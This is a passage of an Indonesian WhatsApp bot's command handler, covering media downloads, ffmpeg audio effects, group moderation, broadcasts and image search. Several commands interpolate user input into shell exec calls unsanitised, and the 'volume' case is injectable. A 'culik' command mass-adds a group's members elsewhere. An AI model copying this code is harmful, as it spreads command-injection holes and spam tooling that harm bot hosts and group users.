var info = await ytdl.getInfo(res.url);
}

let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });

try{
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}

let inithumb = await getBuffer(thumbnya)
let options2 =
{ 
externalAdReply: {
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────    click here to play music `,
description: 'Now Playing...',
mediaType: 1,
renderLargerThumbnail : true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}
}


   
var toks =`
📂 Judul : ${res.title}
🌐 Ditonton : ${h2k(res.views)} Kali 
⏳ Durasi : ${res.timestamp}
👤 Channel : ${res.author.name}
🎧 Audio : ${FileSize(audio[0].contentLength)} 
🎬 Video : ${FileSize(format.contentLength)}`

let aklo = [
{"buttonId": `${prefix}playmp3 ${res.url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${res.url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
Sendbutdocument(from, `*YOUTUBE DOWNLOADER*\n${toks}`, `© Extream`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), aklo, options2)
}
break

			
				

case 'playmp3':
if(!isUrl) return setReply("Masukan link")
try{
setReply("*Downloading...*")
let info = await ytdl.getInfo(q);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if(Number(low) > 100000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
if(audioFormats[0].contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "15") return setReply("Tidak bisa mendownload audio lebih dari 15 menit")
}
downloadMp3(q) 
} catch (err){
console.log(err)
}
break

	
	
case 'playmp4':{
if(!isUrl) return setReply("Masukan link")
let info = await ytdl.getInfo(q);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 700000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
if(format.contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "15") return setReply("Tidak bisa mendownload video lebih dari 15 menit")
}
setReply("*Downloading...*")
downloadMp4 (q) 
}
break

case 'getname':
if(isGroup) {
console.log(users)
const sname = pushname
setReply(sname)
} else if(!isGroup) {
const yahu = pushname
setReply(yahu)
} else{
setReply("Reply targetnya")
}
break
  

case  'del':
    case  'delete':
    case  'd':
if (!isGroup) return setReply('Kusus group')
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if(!mentionByReply) return setReply("Reply pesan")
if (mentionByReply == botNumber) {
xdev.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: dev.quoted.id, participant: mentionByReply } })
} else if(mentionByReply !== botNumber && isBotGroupAdmins){
xdev.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: dev.quoted.id, participant: mentionByReply } })
} 
break


case  'rank':{
function perbandinganSkor(key, order = 'asc') {
return function innerSort(a, b) {
if (!a.hasOwnProperty(key) || !b.hasOwnProperty(key)) {
// property doesn't exist on either object
return setReply("property doesn't exist on either object")
}

const varA = (typeof a[key] === 'string')? a[key].toUpperCase() : a[key];
const varB = (typeof b[key] === 'string')? b[key].toUpperCase() : b[key];
let comparison = 0;
if (varA > varB) {
comparison = 1;
} else if (varA < varB) {
comparison = -1;
}

return ((order === 'desc') ? (comparison * -1) : comparison);
};
}

//Kemudian untuk menggunakannya dengan perintah berikut:

let nana = user.sort(perbandinganSkor('level', 'desc'));



let usernye = `💬「 RANK USER 」\n\nJumlah : ${nana.length}\n\n`
			nana.map(function(e, i){
			
            usernye += (i+1)+`.Nama : ${e.name}\n    Level : ${e.level}\n\n`            
        });
setReply(usernye)
}
break

case 'setexif':
if (!isOwner) return reply(mess.only.owner)
var namaPack = q.split('|')[0] ? q.split('|')[0] : q
var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
exif.create(namaPack, authorPack)
setReply(`Sukses membuat exif`)
break


// Converter & Tools Menu
case 'sticker':  case 'stiker':  case 's':
if (isImage || isQuotedImage) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
   pushname, pack: pushname, // The pack name
    author: packName, // The author name
    type: StickerTypes.FULL, // The sticker type
    categories: ['🤩', '🎉'], // The sticker category
    id: '12345', // The sticker id
    quality: 70, // The quality of the output file
    background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
if(err){ return}
var stream = await downloadContentFromMessage(dev.message.imageMessage || dev.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.jpg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
  exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await xdev.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: dev })
await fs.unlinkSync(`./${rand1}`)
await fs.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}

} else if (isVideo || isQuotedVideo) {
  try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
   pushname, pack: pushname, // The pack name
    author: packName, // The author name
    type: StickerTypes.FULL, // The sticker type
    categories: ['🤩', '🎉'], // The sticker category
    id: '12345', // The sticker id
    quality: 1, // The quality of the output file
    background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
var stream = await downloadContentFromMessage(dev.message.imageMessage || dev.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.mp4')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await xdev.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: dev })
await fs.unlinkSync(`./${rand1}`)
await s.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
  }
} else {
setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}

break

case 'toimg': {
if (!isQuotedSticker) return setReply('Reply stickernya')
setReply(mess.wait)
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(err)
let buffer = fs.readFileSync(ran)
await xdev.sendMessage(from, {caption: "Nih", image: buffer})
fs.unlinkSync(ran)
})
}
break



case 'speed':
setReply(`Speed: ${latensi.toFixed(4)} Second`)
break       
       
case 'runtime':
setReply(`⏰ Bot aktif selama ${runtime(process.uptime())}`)
break

case 'out':
if (!isGroup) return 
if (!isOwner) return onlyOwner()
await xdev.groupLeave(from)
break


case  'ss':
  case 'ssweb':
    if (args.length == 0) return reply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
    xdev.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/ssweb?apikey=ELAINA&url=${args[0]}` } })
    break

case 'bcgc':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
let getGroups = await xdev.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
if(!q) return setReply('teksnya?')
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]

let teks = `*BROADCAST GROUP*\n\n${q}`

	
if (isImage || isQuotedImage) { //Image
let buff = await xdev.downloadAndSaveMediaMessage(quoted)
//let buffer = fs.readFileSync(file)
for (let i of anus) {
await delay(1000)
 await xdev.sendMessage(i, {caption: teks, image: fs.readFileSync(buff)}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, jpegThumbnail: fs.readFileSync('./stik/menu.jpg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else  if (isVideo || isQuotedVideo) { //Video
let buff = await xdev.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await xdev.sendMessage(i, {caption: teks, video: buff}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else if (isAudio || isQuotedAudio) { //Audio
let buff = await xdev.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await xdev.sendMessage(i, {caption: teks, audio: fs.readFileSync(buff)}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: q, orderTitle: q, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else {
for (let i of anus) {
await delay(1000)
await xdev.sendButLoc(i, teks,copyright,fs.readFileSync('./stik/menu.jpg'), yesnih)
}
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break

case 'culik':{
if (!isOwner && !itsMe) return setReply(mess.only.ownerB)
if (args.length < 1) return reply('_*Masukin id grupnya tolol*_')
let mem = [];
await groupMembers.map( i => mem.push(i.id) )
await xdev.groupParticipantsUpdate(q, mem, 'add')
setReply("Sukses")
}
break
	
case 'kick': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!Input) return setReply("Tag/Mention/Masukan nomer target")
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
await xdev.groupParticipantsUpdate(from, [Input], 'remove').then((res) => setReply(`Berhasil mengeluarkan  ${Input.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err))) 
}
break
    

case 'add': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!Input) return setReply("Tag/Mention/Masukan nomer target")
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
await xdev.groupParticipantsUpdate(from, [Input], 'add').then((res) => setReply(`Berhasil menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err))) 
}
break
    
case 'demote': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
await xdev.groupParticipantsUpdate(from, [users], 'demote').then((res) => setReply(`Sukses Demote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break

case 'kickme':
try{
if (!isGroup) return
await xdev.groupParticipantsUpdate(from, [sender], 'remove')
await setReply("Done wkwkw")
} catch (err){
setReply(`${err}`)
}
break

case 'admin': case 'promote': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
await xdev.groupParticipantsUpdate(from, [users], 'promote').then((res) => setReply(`Sukses Promote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break
			
			
case 'pinterest':
if (args.length < 2) return reply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
reply(mess.wait)
var jumlah;
if (q.includes('--')) jumlah = q.split('--')[1]
pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
if (q.includes('--')) {
if (data.result.length < jumlah) {
jumlah = data.result.length
reply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
}
for (let i = 0; i < jumlah; i++) {
xdev.sendMessage(from, { image: { url: data.result[i] }})
}
} else {
var but = [{buttonId: `${command} ${q}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
xdev.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: dev })
}
})
break
			
case 'anime':
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
imageToBase64(pjr)
.then((response) => {
media =  Buffer.from(response, 'base64');
xdev.sendMessage(from,{ image: media,caption:'NIH' },{quoted:dev})
}
)
.catch((error) => {
console.log(error); 
}
)
});
break  

case 'buypremium':
  case 'buyprem':
  try{
  if (!q) return setReply(`Kirim perintah ${prefix}buyprem (jumlah) \n\nHarga 1 Jam premium = Rp50,000`)
  if (isNaN(q)) return setReply(`Harus berupa angka`)
let ane = Number(math(q) * 50000)
 if (getBalance(senderNumber, user) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
 kurangBalance(senderNumber, ane, user)
 let teks =`${q}h`
_prem.addPremiumUser (sender, teks, premium)         
await setReply(`Sukses add premium`)
await xdev.sendButMessage(from, `HALO KAK AKU ${fake}\nkamu telah terdaftar sabagai user premium selama 1 jam\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
 } catch (err){
 setReply(`${err}`)
 }
	break



case 'cecan': 
setReply(mess.wait)
var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
xdev.sendMessage(from, { caption: "Random Cewe Cantik", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: dev })
break
  

    
case 'cogan': 
setReply(mess.wait)
var query = ["cogan hd","cogan indo","cowo ganteng","handsome boy","hot boy","oppa","cowo aesthetic","cogan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
xdev.sendMessage(from, { caption: "Random Cowo Ganteng", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: dev })
break 


case 'join':{
if(!isOwner) return setReply(mess.only.owner)
if (!q) return setReply(`Kirim perintah ${command} _linkgrup_`)
var url = args[1]
let ano = q.split('https://chat.whatsapp.com/')[1]
await xdev.groupAcceptInvite(ano)
setReply("Sukses join group")
}
break


case 'hidetag':
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins && !isOwner && !isPremium) return reply(' hanya premium dan admin ')
let mem = [];
groupMembers.map( i => mem.push(i.id) )
xdev.sendMessage(from, { text: q ? q : '', mentions: mem })
break


case 'lirik':{
if (args.length < 2) return reply(`Kirim perintah ${command} judul lagu`)
setReply(mess.wait)
ra.Musikmatch(q).then(async(data) => {
var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
xdev.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: dev })
}).catch(() => reply(`Judul lagu tidak ditemukan`))
}
break

case 'public':
if (!isOwner) return onlyOwner()
if (publik) return setReply('Udah di mode publick kak')
publik = true
let bab =`Mode public aktif kak`
setReply(bab)
break
           
case 'self':
if (!isOwner) return onlyOwner()
if (publik == false) return setReply('Udah di mode self kak')
publik = false
let breh =`Mode self aktif kak`
setReply(breh)
break


case 'quotes':
var data = await fetchJson(`https://megayaa.herokuapp.com/api/randomquote`)
setReply(data.result.quotes+'\n\n-- '+data.result.author)
break


case 'kalkulator':
const matematik = require('mathjs')
try{
let nana = q.replace("x","*")
let nunu = matematik.evaluate(nana)
let teks = `${q} = ${nunu}`
setReply(teks)
} catch (err){
setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
break


case 'toptt':
if (isQuotedAudio){
setReply(mess.wait)
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let topt = fs.readFileSync(ran)
await xdev.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: dev})
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio")
}
break


case 'togif':
if ( isQuotedSticker) {
setReply(mess.wait)
let file = await  xdev.downloadAndSaveMediaMessage(quoted)
let outGif = `./temp/${getRandom('.gif')}`
let outMp4 = `./temp/${getRandom('.mp4')}`

//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
 }      
await sendGif(fs.readFileSync(outMp4))
 fs.unlinkSync(outGif)
 fs.unlinkSync(outMp4)
 fs.unlinkSync(file)
    })
}) 

} else if(isQuotedVideo){
setReply(mess.wait)
let outMp4 = getRandom('.mp4')
let file = await xdev.downloadAndSaveMediaMessage(quoted)
let nana = await fs.readFileSync(file)
await sendGif(nana)
await fs.unlinkSync(file)
}
break




case 'tomp3':
if (isQuotedVideo) {
setReply(mess.wait)
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply("Reply videonya")
}
break
            
            

            
case 'hode':
 if(isQuotedAudio) { 
setReply(mess.wait)
let medok = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medok)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break

case 'volume':
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (isQuotedAudio){ 
setReply(mess.wait)
let media3 = await xdev.downloadAndSaveMediaMessage(quoted)
let rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
if (err) return setReply('Error!')
let jadie = fs.readFileSync(rname)
await xdev.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4', ptt: true }, {quoted: dev})
fs.unlinkSync(rname)
fs.unlinkSync(media3)
}
)
} else {
setReply('Reply audio!')
}
break
           
            
case 'ghost':
if(isQuotedAudio) { 
setReply(mess.wait)
let mele = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mele)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
}) 
} else {
setReply('Reply audionya')
}
break



case 'nightcore':
if(isQuotedAudio) { 
setReply(mess.wait)
let mela = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mela)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break



case 'tupai':
if(isQuotedAudio) { 
setReply(mess.wait)
let medoi = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medoi)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break


case 'ping': {
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
setReply(respon)
            }
            break


case 'imut':
if(isQuotedAudio) { 
setReply(mess.wait) 
let masa = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break



case 'whatmusic':
if (isQuotedAudio) {
setReply(mess.wait)
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
xdev.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
})
} else if (isQuotedVideo) {
setReply(mess.wait)
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
xdev.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
 })
 } else {
setReply("Reply audio atau video")
}
break





case 'infobotz':{       
var groups = totalchat.filter(v => v.endsWith('g.us'))
var privat = totalchat.filter(v => v.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
var ram3 =`${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`
let uptime = process.uptime();
const timestampu = speed();
var total = math(`${groups.length} ${privat.length}`)
var wa_version = xdev.waVersion
var mcc = "Error"
var mnc = "Error"
var os_version = "Error"
var device_manufacturer = "Error"
var device_model = "Error"
let gender ="Female"
let nomerOwner =`Ownerin.split("@")[0]`
let menunya =`
「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」

*▸* Nama : ${fake}
*▸* Gender : ${gender}
*▸* Private Chat : ${privat.length}
